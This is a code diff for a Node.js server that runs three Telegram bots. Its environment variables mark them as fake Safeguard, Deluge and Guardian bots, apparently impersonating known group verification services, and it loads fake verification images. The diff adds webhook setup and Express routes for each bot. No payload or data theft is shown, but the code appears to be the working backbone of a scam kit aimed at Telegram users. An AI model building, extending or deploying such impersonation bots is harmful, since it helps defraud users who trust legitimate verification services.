@@ -22,8 +22,11 @@ const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verifi
 const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));
 
 const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN);
+safeguardBot.setWebHook(`${process.env.DOMAIN}/api/webhook/safeguard`);
 const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN);
+delugeBot.setWebHook(`${process.env.DOMAIN}/api/webhook/deluge`);
 const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN);
+guardianBot.setWebHook(`${process.env.DOMAIN}/api/webhook/guardian`);
 
 const guardianButtonTexts = [
   "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
@@ -279,5 +282,18 @@ handleNewChatMember(guardianBot, "guardian");
 handleStart(safeguardBot);
 handleStart(delugeBot);
 handleStart(guardianBot);
+
+app.post('/api/webhook/safeguard', (req, res) => {
+  safeguardBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+app.post('/api/webhook/deluge', (req, res) => {
+  delugeBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+app.post('/api/webhook/guardian', (req, res) => {
+  guardianBot.processUpdate(req.body);
+  res.sendStatus(200);
+});
 
 app.listen(process.env.PORT || 80, () => console.log(`loaded everyone & running on port ${process.env.PORT}`));
